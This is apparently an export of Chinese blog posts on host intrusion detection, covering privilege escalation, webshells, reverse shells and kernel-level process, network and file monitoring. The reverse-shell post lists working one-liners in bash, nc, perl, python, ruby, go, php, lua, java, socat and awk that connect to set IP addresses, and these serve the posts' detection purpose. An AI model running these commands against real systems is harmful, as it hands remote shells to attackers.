[{"title":"反入侵策略总结-提权检测","url":"/2019/06/15/反入侵策略总结-提权检测/","content":"\n# 什么是提权\n\n利用里系统存在的漏洞，执行漏洞利用程序，从**低权限的用户获取到一个高权限的shell。**\n\n# SUID提权\n\n## 演示\n\n```c\n#include <unistd.h>\n#include <stdlib.h>\nint main(void)\n{\n    setuid(0);\n    setgid(0);\n    system(\"ps\");\n    return 0;\n}\n```\n\n## 误报排除\n\n查找suid权限\n\n`find / -perm -u=s -type f 2>/dev/null | grep -v docker`\n\n**sudo误报：**\n\n```shell\n#!/bin/bash\n\nwhile :\ndo\n    sleep 5\ndone\n```\n\n- 低权限用户运行上述脚本\n\n- 动态监控进程`watch -n 1 -d 'ps -ef | grep passwd'`\n- 观察到进程权限为root\n\n![img](/images/a15/1.png)\n\n**passwd误报：**\n\n![img](/images/a15/2.png)\n\n- 使用低权限用户修改自己账号密码\n\n- 动态监控进程`watch -n 1 -d 'ps -ef | grep passwd'`\n- 观察到进程权限为root\n\n其他含有suid的文件（包括docker文件，图中排除了），这些文件运行可能会触发误报。\n\n![img](/images/a15/3.png)\n\n## 检测\n\n**动态进程监控：**\n\n1. 监控新建的进程，如果当前进程是root权限，并且父进程是低权限用户，则执行第2步\n2. 排除白名单suid的误报，查看当前进程的子进程是否启动了shell进程\n3. shell进程的判断可通过`/proc/[pid]/exe`对应的具体文件判断\n\n**静态文件检测：**\n\n通过Inotify技术实时监控系统环境变量$PATH下可执行文件的所有者和S_ISUID、S_ISGID位的改变，主要针对通过chown、chmod等命令修改文件所有者和文件权限的行为。\n\n# 内核漏洞提权\n\n内核提权过程\n\n![img](/images/a15/4.png)\n\n## 检测\n\n1. 监控新建的进程，如果当前进程是低权限用户，而子进程的shell是高权限用户，则告警\n2. 除了上述分析的误报，实际情况中可能还存在误报情况，可结合后期运营优化规则降低误报\n\n# 进程自身提权\n\n1. 检测进程自身权限提升的行为，即：非root进程转变成了root进程。\n2. 进程将权限提升为CAP_SETUID和CAP_SETGID \n\n## 检测\n\n扫描/proc下的进程UID、PID信息，保存起来作为基线。Netlink可以通过回调实时监测所有进程的PID/UID是否有修改。如果有修改，则存在提权行为。\n\nNetlink实时监测通过commit_creds、setuid、setresuid等系统API修改uid和gid的行为。提权判断规则如下：\n\n- euid从非0提升为0\n\n- egid从非0提升为0\n\n# 进程提升capbility\n\n进程将权限提升为CAP_SETUID和CAP_SETGID\n\n## 检测\n\n主要针对通过内核模块修改进程结构体的方式提升进程的权限。通过周期性的对比proc/[pid]/status中记录的egid、euid的变化来判断进程是否被提权。proc/[pid]/status中记录了进程的基本信息，包括：pid，uid，以及CapInh，CapPrm，CapEff等信息。\n\n判断规则如下：\n\n1. cap_setuid是否从无效变成有效\n\n2. uid从非0提升为0\n\n3. euid从非0提升为0\n\n4. egid从非0提升为0\n\n5. 父进程的euid和egid非0，但子进程的euid为0。                             \n\n\n\n**参考：**\n\nhttps://blog.csdn.net/Fly_hps/article/details/80301935\n\n[https://mochazz.github.io/2018/06/09/Linux提权之SUID/#环境搭建](https://mochazz.github.io/2018/06/09/Linux提权之SUID/#环境搭建)\n\nhttps://security.tencent.com/index.php/blog/msg/21","tags":["提权","suid"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-webshell检测","url":"/2019/06/05/反入侵策略总结-webshell检测/","content":"\n# 静态规则检测\n\n通过之前的`inotity`机制监控web目录下文件的变动，可以通过以下几种维度进行恶意判断\n\n| 检测点   | 基于业务特点       | 正常                                     | 异常                             |\n| -------- | ------------------ | ---------------------------------------- | -------------------------------- |\n| 文件属主 | 统一的发布时间     | 属主为发布系统启动账户                   | 属主为webserver进程账户          |\n| 生成时间 | 工作时间           | 工作时间内生成                           | 非工作时间生成                   |\n| 生成时间 | 同目录文件统一生成 | 大概率与同目录内其他文件在连续时间内生成 | 与同目录其他文件生成时间相差甚远 |\n| inode    | 同目录文件统一生成 | 同目录下文件inode连续分布                | 与同目录其他文件inode相差甚远    |\n| 目录     | 上层目录不保存CGI  | CGI文件位于Web用户不可写目录             | 位于上传文件夹                   |\n\n静态规则就时使用正则去匹配， 参考笔者的 https://github.com/he1m4n6a/findWebshell\n\n# 反弹shell检测 \n\n黑客获取webshell一般都是为了执行系统命令，一般会先反弹一个shell。检测规则：\n\n1. 通过netlink监控新建的进程\n\n2. 如果新bash进程属主是www-data（nginx进程权限属主），则存在被入侵风险\n\n   ![](/images/a14/1.png)\n\n   ![](/images/a14/2.png)\n   \n   ![](/images/a14/3.png)\n\n# 命令执行检测\n\n反弹shell必定伴随着命令执行，内核监控exec等调用，查看执行命令的父进程是不是nginx等web进程，如果www-data的bash进程执行了系统命令则存在被入侵的情况。\n\n![](/images/a14/4.png)\n\n# 机器学习检测\n\n参考 https://zhuanlan.zhihu.com/p/58676764 \n\n1. 计算文件的熵值\n\n   正常文件的熵主要分布在4-6之间，形如正态分布，峰值在5左右，而webshell的分布更多的位于5-6之间。 \n\n2. 命令执行类函数\n\n   统计` assert() eval() system() cmd_shell() shell_exec() `出现的次数。\n\n   依照这个思想，我们还可以选区常见的：\n\n   （1）文件，目录操作类函数\n\n   （2）解码编码类函数\n\n   （3）文件压缩类函数\n\n   （4）字符编码转换类函数\n\n   （5）字符替换类函数\n\n   （6）动态函数类等其他敏感不常见操作\n\n3.  最长的单词长度 \n\n    这个主要是针对进行编码加密的文件，他可能把符合php愈发的文件加密的乱七八糟 \n\n# 其他检测\n\n其他的检测，不是集成在HIDS中。方法有：\n\n1. **流量检测：**通过检测流量中的特征，比如中国菜刀进行webshell通信时候就有特征码。\n2. **RASP检测：**无论你的代码怎么混淆，最终底层解析还是一样的，RASP就可以在底层hook，获取混淆前的代码，在用之前的静态规则进行检测。\n\n**总结：**\n\nHIDS上不是只使用一种规则进行检测，都是多种规则和方法相互补充，类似于纵深防御的概念。因为一种方法总是有疏漏点，而多种方法相结合的方式可以把疏漏降低到最低。\n\n\n\n**参考：**\n\nhttps://paper.seebug.org/526/#_3\n\nhttps://github.com/hi-WenR0/MLCheckWebshell \n\nhttps://zhuanlan.zhihu.com/p/58676764\n\nhttps://github.com/dennybritz/cnn-text-classification-tf/","tags":["inotify","webshell","机器学习"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-反弹shell监控","url":"/2019/05/25/反入侵策略总结-反弹shell监控/","content":"\n# 重定向指令\n\nlinux文件描述符可以理解为**linux跟踪打开文件而分配的一个数字句柄**，这个数字本质上是一个文件句柄，通过句柄就可以实现文件的读写操作。\n\n当Linux启动的时候会默认打开三个文件描述符，分别是：\n\n- 标准输入：standard input 0 （默认设备键盘）\n- 标准输出：standard output 1（默认设备显示器）\n- 错误输出：error output 2（默认设备显示器）\n\n![img](/images/a13/1.png)\n\n进程启动后再打开新的文件，描述符会自动依次增加。每一个新进程都会继承其父进程的文件描述符，因此所有的shell命令（本质上也是启动新进程），都会默认有三个文件描述符。\n\n**Linux一切皆文件**，键盘、显示器设备也是文件，因此他们的输入输出也是由文件描述符控制。如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。\n\n##  重定向分类\n\n重定向主要分为两种\n\n- 输入重定向\n  - “<”\n  - “<<”\n- 输出重定向\n  - “>”\n  - “>>”\n\nbash在执行一条指令的时候，首先会检查命令中是否存在文件描述符重定向的符号，如果存在那么**首先将文件描述符重定向（预处理）**，然后在把重定向去掉，继续执行指令。如果指令中存在多个重定向，重定向**从左向右解析**。\n\n## 输入重定向\n\n```\n[n]< word （注意[n]与<之间没有空格）\n```\n\n说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）。\n\n![img](/images/a13/2.png)\n\n解析器解析到 \"<\" 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。\n\n![img](/images/a13/3.png)\n\n## 输出重定向\n\n```\n[n]> word\n```\n\n说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）。\n\n![img](/images/a13/4.png) \n\n上述指令将文件描述符1（标准输出）重定向到了指定文件。\n\n![img](/images/a13/5.png)\n\n## 标准输出与标准错误输出重定向\n\n下面3种形式完全等价，\n\n```\n&> word \n>& word\n> word 2>&1：将标准错误输出复制到标准输出\n```\n\n说明：将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开）。\n\n![img](/images/a13/6.png) \n\n解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。\n\n![img](/images/a13/7.png)\n\n## 文件描述符的复制\n\n```\n[n]<&[m] \nn]>&[m] \n注意：这里所有字符之间不要有空格\n```\n\n- 这两个指令都是将文件描述符 n 复制到 m ，两者的区别是\n  - [n]<&[m] ：以只读的形式打开\n  - n]>&[m] ：以写的形式打开\n- 这里的 & 目的是为了区分数字名字的文件和文件描述符，如果没有 & 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符\n\n![img](/images/a13/8.png)\n\n注意，重定向符号的顺序不能随便换，因为系统是从左到右执行。我们来分析上面指令结果出现的原理，\n\n**首先解析器解析到 2>&1**\n\n![img](/images/a13/9.png)\n\n**解析器再向后解析到 “>”** \n\n![img](/images/a13/10.png)\n\n## exec 绑定重定向\n\n```\nexec [n] <> file/[n]：以读写方式打开file指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入\nexec [n] < file/[n] \nexec [n] > file/[n]\n```\n\n使用 exec 指令，可以让重定向在接下来的会话中（多条指令）持续有效。![img](../images/a14/11.png)\n\n ![img](/images/a13/12.png)\n\n# bash反弹shell分类\n\n## bash反弹shell\n\n`bash -i >& /dev/tcp/10.107.98.24/2345 0>&1`\n\n ![img](/images/a13/13.png) \n\n## telnet反弹shell\n\n`telnet 10.107.98.24 4444 | /bin/bash | telnet 10.107.98.24 5555`\n\n ![img](/images/a13/14.png)\n\n## 管道反弹shell\n\n `rm /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.107.98.24 4444 >/tmp/f`\n\n ![img](/images/a13/15.png)\n\n## 脚本反弹shell \n\n### perl反弹shell\n\n```perl\nperl -e 'use Socket;$i=\"10.107.98.24\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n```\n\n ![img](/images/a13/16.png)\n\n### ruby反弹shell\n\n```ruby\nruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)’\n```\n\n### go反弹shell\n\n```go\necho 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.0.134:8080\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n```\n\n### php反弹shell\n\n```php\nphp –r  'exec(\"/bin/bash -i >& /dev/tcp/127.0.0.1/7777\")’\n```\n\n### lua反弹shell\n\n```lua\nlua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');\"\n```\n\n### java反弹shell\n\n```java\nr = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()\n```\n\n### python反弹shell \n\n```python\npython -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"\n```\n\n ![img](/images/a13/17.png) \n\n## nc反弹shell\n\n```shell\nnc -e /bin/sh 192.168.146.129 2333\n```\n\n## socat反弹shell\n\n```shell\n# 监听命令\nsocat file:`tty`,raw,echo=0 tcp-listen:9999\n\n# 反弹命令\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.211.55.2:9999\n```\n\n![img](/images/a13/19.png)\n\n# 无bash反弹shell\n\npython版本\n\n```python\npython -c \"exec(\\\"import socket, subprocess;s = socket.socket();s.connect(('10.107.97.119 ',4444))\\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\\")\"\n```\n\nperl版本\n\n```perl\nperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.107.97.119:4444\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n```\n\n shell版本\n\n```shell\nawk 'BEGIN{s=\"/inet/tcp/0/10.107.97.119/4444\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'\n```\n\n# shell检测\n\n## bash反弹shell检测\n\n**检测 file descriptor 是否指向一个socket:**\n\n以`“重定向符”+\"/dev/tcp`网络通信\"Bash反弹Shell这一类最经典的反弹Shell攻击方式为例，这类反弹shell的本质可以归纳为**file descriptor的重定向到一个socket句柄**\n\n![img](/images/a13/20.png)\n\n![img](/images/a13/21.png)\n\n**检测 file descriptor 是否指向一个管道符（pipe）:**\n\n对于利用“管道符”传递指令的反弹shell攻击方式来说，这类反弹shell的本质可以归纳为**file descriptor的重定向到一个pipe句柄**\n\n![img](/images/a13/22.png)\n\n### 检测方法\n\n1. 通过上一篇文章的某种方法检测内核的进程事件\n2. 判断是否是bash进程，如果是bash进程则获取父进程的信息\n3. 获取父进程的`/proc/[pid]/fd`，判断是否有存在fd重定向到pipe或者socket情况\n4. 如果存在3情况，则告警\n\n**绕过风险：仅能通过进程执行文件名判断是否为Shell进程，上传可执行文件、拷贝Bash文件到其他路径等方法会绕过这个方法**。例如这篇[文章](https://www.cnblogs.com/LittleHann/p/4596223.html#_label8)提到的，通过将/bin/sh重命名为其他名字进行反弹shell。\n\n## 非bash反弹shell检测\n\nBash只是一个应用程序的普通应用，其内部封装了调用glibc execve的功能而已，除了bash之外，白帽子还可以基于任意的应用层技术来实现反弹shell，例如：\n\n- python/perl实现纯代码形式的反弹shell文件执行：[**文件脚本检测**](https://he1m4n6a.github.io/2019/04/09/%E5%8F%8D%E5%85%A5%E4%BE%B5%E7%AD%96%E7%95%A5%E6%80%BB%E7%BB%93-%E6%81%B6%E6%84%8F%E5%91%BD%E4%BB%A4%E6%A3%80%E6%B5%8B/)\n- python/perl实现纯代码形式的反弹shell命令行指令（fileless）：[**纯命令行fileless检测**](https://he1m4n6a.github.io/2019/04/09/%E5%8F%8D%E5%85%A5%E4%BE%B5%E7%AD%96%E7%95%A5%E6%80%BB%E7%BB%93-%E6%81%B6%E6%84%8F%E5%91%BD%E4%BB%A4%E6%A3%80%E6%B5%8B/)\n- C/C++实现纯代码形式的反弹shell：**二进制文件检测**\n\n无论怎么实现，这个进程肯定是有网络通信的事件，通过进程和socket事件关联情况，获取网络通信的协议。如果有相应的网络事件，在对进程所对应的文件进行上述情形进行安全检查。\n\n### 进程和socket事件关联\n\n[关联process和socket数据](https://blog.spoock.com/2018/12/06/osquery-source-analysis-process-open-socket/)\n\n1. 遍历`/proc`，获取所有进程的pid\n2. 通过pid，遍历`/proc/pid/fd`对应的link链接，检查是否存在`socket:[]`，存在就获取对应的inode\n3. 获取`/proc/pid/ns`中net的inode\n4. 遍历 `/proc/pid/net/`下的`icmp/tcp/udp/udplite/raw`的协议\n5. 比较第四步中的inode信息与第一步的inode信息，一致的就是我们需要获取的数据。\n\n## 网络层检测\n\n### dns&icmp反弹shell\n\n本质上说，dns和icmp是一种网络通信方式，使用任何语言都可以借助这两种网络通信方式进行反弹shell交互。\n\n但是我们知道，dns和icmp和tcp/udp不一样，它们都不是直连的网络信道，而是需要通过一个第三方进行消息中转。\n\n- **dns（udp直连模式）**\n\n  - control server将指令封装成dns包格式，通过udp53直接发送给client\n  - victim client从udp53接收到dns包后进行解析，从中提取并解码得到指令，并将执行结果封装成dns包格式，通过udp53返回给server\n\n- **dns（authoritative DNS server转发模式）**\n\n  - victim client配置好dns resolve（domain nameserver），之后将所有的执行结果和指令请求都以正常dns query的形式发送给local DNS server，随后通过dns递归查询最终会发送到攻击者控制的domain nameserver上\n  - control server从dns query中过滤出反弹shell相关的会话通信，并按照dns response的形式返回主控指令。 \n\n- **icmp**\n\n  参考https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1\n\n### 检测方法\n\n这个是NIDS范畴的内容了，主要思想是根据特征码进行检测。\n\n反弹shell的通信会话中，会包含一些`cmdline shell特征`，例如`#root....`等，可以在网络侧进行NTA实时检测。\n\n\n\n**参考：**\n\nhttps://xz.aliyun.com/t/2549\n\nhttps://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html\n\nhttps://www.cnblogs.com/shanmao/archive/2012/12/26/2834210.html\n\nhttps://xz.aliyun.com/t/6727\n\nhttps://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_5","tags":["反入侵","bash重定向","反弹shell"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-进程网络监控","url":"/2019/05/10/反入侵策略总结-进程网络监控/","content":"\n# publisher/subscriber架构\n\nosquery使用了[auditd](https://www.ibm.com/developerworks/cn/linux/l-lo-use-space-audit-tool/index.html)来获取系统调用。关于系统调用的方法优缺点后面会讲到，现在学习介绍下osquery的p/s框架，优秀的框架对我们很有借鉴意义。\n\n## auditd监控实战\n\n我们通过一个实际的例子来对`audit.log`的日志结构以及unix中的`connect`内核调用进行一个简单的说明。设置规则\n\n```shell\n# auditctl -l\nNo rules\n# auditctl -a always,exit -F arch=b64 -S connect\n# auditctl -l\n-a always,exit -F arch=b64 -S connect\n```\n\n执行`curl www.baidu.com`，查看`/var/log/audit/audit.log`日志，找到其中与`curl www.baidu.com`相关的日志记录：\n\n```shell\ntype=SYSCALL msg=audit(1544195763.393:260010): arch=c000003e syscall=42 success=no exit=-115 a0=3 a1=7ffccb794910 a2=10 a3=7ffccb7941e0 items=0 ppid=53240 pid=17096 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts5 ses=1 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)\ntype=SOCKADDR msg=audit(1544195763.393:260010): saddr=0200005073EFD21B0000000000000000\ntype=PROCTITLE msg=audit(1544195763.393:260010): proctitle=6375726C007777772E62616964752E636F6D\n```\n\n此事件由三个记录组成（每个以`type=`作为开始）,共享相同的时间戳和编号(其中`1544192911.452`是时间戳，`28850`是事件编号)。每个记录包含好几对 name=value ，由空格或者逗号分开。[理解审核日志文件](https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/7/html/security_guide/sec-understanding_audit_log_files)对`audit.log`中的日志文件进行了详细地解释。[审核系统引用](https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/7/html/security_guide/app-Audit_Reference#sec-Audit_Events_Fields)对日志中的每一个`name=value`都进行了详细地说明。在本文仅仅只对其中几个关键的字段进行说明。\n\n- `type=SYSCALL`，其中`SYSCALL`就表示连接到 Kernel 的系统调用触发了这个记录，在[审核记录类型](https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/7/html/security_guide/sec-Audit_Record_Types)中记录了所有的类型。\n- `syscall=42`，表示当前的系统调用值是42，由于我们记录的`connect`内核调用，说明42就表示`connect`内核调用。[Linux系统调用列表](https://www.ibm.com/developerworks/cn/linux/kernel/syscall/part1/appendix.html)记录了所有的内核调用\n- `success=no`，表示这个系统调用是成功还是失败。在本例中是没有成功。\n- `exit=-115`,表示的是系统调用的返回值。\n- `exe=\"/usr/bin/curl\"`，记录了进程的可执行路径。\n- `saddr=0200005073EFD21B0000000000000000`，表示的是系统调用的远程地址。(因为是`connect`内核调用，那么必然会与远程服务器通信)\n- `proctitle=6375726C007777772E62616964752E636F6D`，记录的是具体的执行的命令。\n- `a0-a3`,记录了内核调用的前四个参数。\n\n由于其中的很多信息都进行了编码不便于我们理解，可以使用`ausearch`解析上面的audit的日志，由于已经知道了`event id`是`28850`,直接使用`ausearch --interpret -a 260010`解析。\n\n```shell\ntype=PROCTITLE msg=audit(12/07/2018 10:16:03.393:260010) : proctitle=curl www.baidu.com \ntype=SOCKADDR msg=audit(12/07/2018 10:16:03.393:260010) : saddr={ fam=inet laddr=115.239.210.27 lport=80 } \ntype=SYSCALL msg=audit(12/07/2018 10:16:03.393:260010) : arch=x86_64 syscall=connect success=no exit=EINPROGRESS(Operation now in progress) a0=0x3 a1=0x7ffccb794910 a2=0x10 a3=0x7ffccb7941e0 items=0 ppid=53240 pid=17096 auid=username uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts5 ses=1 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)\n```\n\n其中`proctitle=curl www.baidu.com`就解析出了我们的命令；`saddr={ fam=inet laddr=115.239.210.27 lport=80 }`解析除了`wwww.baidu.com`的IP地址(当然是DNS的地址),`auid=username`显示的是哪个用户执行的命令。\n\n## osquery解析audit\n\n使用文档参考：https://s0osquery0readthedocs0io.icopy.site/en/latest/deployment/process-auditing/\n\nosquery如果想要借助于`auditd`来获取信息，就需要关闭系统的`auditd`服务，由`osquery`来接管。`osquery`接管了之后就会默认地加入三条auditd的规则。\n\n```shell\n-a always,exit -S connect-a always,exit -S bind-a always,exit -S execve\n```\n\n由于利用`auditd`获取数据的方式与之前说明的`shell_history`/`process_open_socket`方式完全不同，osquery采用了`event publisher/subscriber`的架构来处理。\n\n> An osquery event publisher is a combination of a threaded run loop and event storage abstraction. The publisher loops on some selected resource or uses operating system APIs to register callbacks. The loop or callback introspects on the event and sends it to every appropriate subscriber. An osquery event subscriber will send subscriptions to a publisher, save published data, and react to a query by returning appropriate data.\n\n大致的中文意思是：osquery的事件发布结合了进程循环和事件存储。发布者(publisher )会对某些特定的资源循环或者是对操作系统的API回调。这些循环和回调得到信息之后就会发送至订阅者(subscriber)。这些订阅者就会保存数据，对SQL语句进行相应。\n\n# 进程监控\n\n[https://he1m4n6a.github.io/2020/02/22/反入侵策略总结-内核监控方式/](https://he1m4n6a.github.io/2020/02/22/反入侵策略总结-内核监控方式/) 上篇总结了监控系统调用的几种方法，进程监控主要监控两方面：\n\n1. 新建进程\n2. 进程执行命令\n\n**新建进程用的是`fork`、`vfork`、`clone`这三个函数，我们在内核中监控三个对应的系统调用即可。**\n\n- `fork` fork创造的子进程是父进程的完整副本，复制了父亲进程的资源，包括内存的内容task_struct内容\n\n- `vfork` vfork创建的子进程与父进程共享数据段,而且由vfork()创建的子进程将先于父进程运行\n\n- `clone` Linux上创建线程一般使用的是pthread库 实际上linux也给我们提供了创建线程的系统调用，就是clone\n\n**注意：**当监控`clone`调用时候，需要剔除CLONE_THREAD\n\n**执行命命监控的是`execve`和`execveat`这两个系统调用。**\n\n- [execve](http://man7.org/linux/man-pages/man2/execve.2.html) 执行程序\n- [execveat](http://man7.org/linux/man-pages/man2/execveat.2.html) 执行一个关于目录描述符的程序\n\n# 网络监控\n\n和进程监控类似，只不过监控的是内核调用`connec`和`bind`\n\n```c++\nconst auto &event_data = boost::get<SyscallAuditEventData>(event.data);\n// 判断类别\nif (event_data.syscall_number == __NR_connect) {\n\trow[\"action\"] = \"connect\";\n} else if (event_data.syscall_number == __NR_bind) {\n\trow[\"action\"] = \"bind\";\n} else {\n\tcontinue;\n}\n```\n\n# 文件监控\n\n## 什么是inotify\n\ninotify是Linux中用于监控文件系统变化的一个框架，不同于前一个框架dnotify, inotify可以实现基于inode的文件监控。也就是说监控对象不再局限于目录，也包含了文件。不仅如此，在事件的通知方面，inotify摈弃了dnotify的信号方式，采用在文件系统的处理函数中放置hook函数的方式实现。\n\n在inotify中，对于一个文件或目录的监控被称为一个watch。 给某一个文件或目录添加一个watch就表示要对该文件添加某一类型的监控。监控的类型由一个掩码Mask表示，mask有：\n\n```\nIN_ACCESS ： 文件的读操作\n\nIN_ATTRIB ： 文件属性变化\n\nIN_CLOSE_WRITE ： 文件被关闭之前被写\n\nIN_CLOSE_NOWRITE ： 文件被关闭\n\nIN_CREATE ： 新建文件\n\nIN_DELETE ： 删除文件\n\nIN_MODIFY ： 修改文件\n\nIN_MOVE_SELF ： 被监控的文件或者目录被移动\n\nIN_MOVED_FROM ： 文件从被监控的目录中移出\n\nIN_MOVED_TO ： 文件从被监控的目录中移入\n\nIN_OPEN ： 文件被打开\n```\n\n## 原理\n\ninotify通过在文件系统的操作函数(vfs_open, vfs_unlink等)中插入hook函数改变代码的执行路径，从而产生相应的事件。以下是一个hook函数的列表： ![img](/images/a12/1.png) \n\n## 使用\n\nInotify 提供 3 个系统调用，它们可以构建各种各样的文件系统监控器：\n\n- `inotify_init()` 在内核中创建 inotify 子系统的一个实例，成功的话将返回一个文件描述符，失败则返回 -1。就像其他系统调用一样，如果 `inotify_init()` 失败，请检查 `errno` 以获得诊断信息。\n- 顾名思义，`inotify_add_watch()` 用于添加监视器。每个监视器必须提供一个路径名和相关事件的列表（每个事件由一个常量指定，比如 IN_MODIFY）。要监控多个事件，只需在事件之间使用逻辑操作符*或* — C 语言中的管道线（`|`）操作符。如果 `inotify_add_watch()` 成功，该调用会为已注册的监视器返回一个惟一的标识符；否则，返回 -1。使用这个标识符更改或删除相关的监视器。\n- `inotify_rm_watch()` 删除一个监视器。\n\n**监控创建、删除和修改事件的目录代码:**\n\n```c++\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <sys/types.h>\n#include <sys/inotify.h>\n \n#define EVENT_SIZE  ( sizeof (struct inotify_event) )\n#define BUF_LEN     ( 1024 * ( EVENT_SIZE + 16 ) )\n \nint main( int argc, char **argv ) \n{\n  int length, i = 0;\n  int fd;\n  int wd;\n  char buffer[BUF_LEN];\n \n  fd = inotify_init();\n \n  if ( fd < 0 ) {\n    perror( \"inotify_init\" );\n  }\n \n  wd = inotify_add_watch( fd, \"/home/strike\", \n                         IN_MODIFY | IN_CREATE | IN_DELETE );\n  length = read( fd, buffer, BUF_LEN );  \n \n  if ( length < 0 ) {\n    perror( \"read\" );\n  }  \n \n  while ( i < length ) {\n    struct inotify_event *event = ( struct inotify_event * ) &buffer[ i ];\n    if ( event->len ) {\n      if ( event->mask & IN_CREATE ) {\n        if ( event->mask & IN_ISDIR ) {\n          printf( \"The directory %s was created.\\n\", event->name );       \n        }\n        else {\n          printf( \"The file %s was created.\\n\", event->name );\n        }\n      }\n      else if ( event->mask & IN_DELETE ) {\n        if ( event->mask & IN_ISDIR ) {\n          printf( \"The directory %s was deleted.\\n\", event->name );       \n        }\n        else {\n          printf( \"The file %s was deleted.\\n\", event->name );\n        }\n      }\n      else if ( event->mask & IN_MODIFY ) {\n        if ( event->mask & IN_ISDIR ) {\n          printf( \"The directory %s was modified.\\n\", event->name );\n        }\n        else {\n          printf( \"The file %s was modified.\\n\", event->name );\n        }\n      }\n    }\n    i += EVENT_SIZE + event->len;\n  }\n \n  ( void ) inotify_rm_watch( fd, wd );\n  ( void ) close( fd );\n \n  exit( 0 );\n}\n```\n\n1. 这个应用程序通过 `fd = inotify_init();` \n2. 创建一个 inotify 实例，并添加一个监视器来监控修改、新建、删除的文件（由 `wd = inotify_add_watch(...)` 指定）。\n3. `read()` 方法在一个或多个警告到达之前是被阻塞的。警告的详细内容 — 每个文件、每个事件 — 是以字节流的形式发送的；因此，应用程序中的循环将字节流转换成一系列事件结构。\n\n在文件 /usr/include/sys/inotify.h. 中，您可以找到事件结构的定义，它是一种 C 结构：\n\n```c++\nstruct inotify_event \n{\n  int wd;       /* The watch descriptor */\n  uint32_t mask;    /* Watch mask */\n  uint32_t cookie;  /* A cookie to tie two events together */\n  uint32_t len;     /* The length of the filename found in the name field */\n  char name __flexarr;  /* The name of the file, padding to the end with NULs */    \n} \n```\n\n\n\n# 总结\n\n进程、网络、文件的监控，都可以用上一章节hook系统调用的方式进行监控，但对于文件监控来说，因为linux自带了inotify的监控审计框架，我们可以直接通过用户态编程使用inotify的框架。对于进程和网络监控主要是对关键函数的hook，以及hook框架的选型。\n\n**参考：**\n\nhttps://www.sohu.com/a/244164762_467784\n\nhttps://www.ibm.com/developerworks/cn/linux/l-ubuntu-inotify/","tags":["inotify","反入侵","内核监控","audit"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-内核监控方式","url":"/2019/04/23/反入侵策略总结-内核监控方式/","content":"\n转自 https://www.freebuf.com/column/208928.html，本文已归纳的很好，如有补充我直接补充在文章中不单独标注说明了.\n\n# 内核监控方式\n\n目前来看，常见的获取进程创建的信息的方式有以下四种：\n\n- So preload\n- Netlink Connector\n- Audit\n- Syscall hook\n\n# So preload\n\n## 原理\n\n1. Linux 中大部分的可执行程序是动态链接的，常用的有关进程执行的函数例如 `execve`均实现在 libc.so 这个动态链接库中。\n\n1. Linux 提供了一个 so preload 的机制，它允许定义优先加载的动态链接库，方便使用者有选择地载入不同动态链接库中的相同函数。\n\n结合上述两点不难得出，我们可以通过 so preload 来覆盖 libc.so 中的 `execve`等函数来监控进程的创建。\n\n## 演示\n\n1. 创建文件 hook.c ，内容如下：\n\n   ```c\n   #define _GNU_SOURCE\n   #include <stdio.h>\n   #include <unistd.h>\n   #include <dlfcn.h>\n   \n   typedef ssize_t 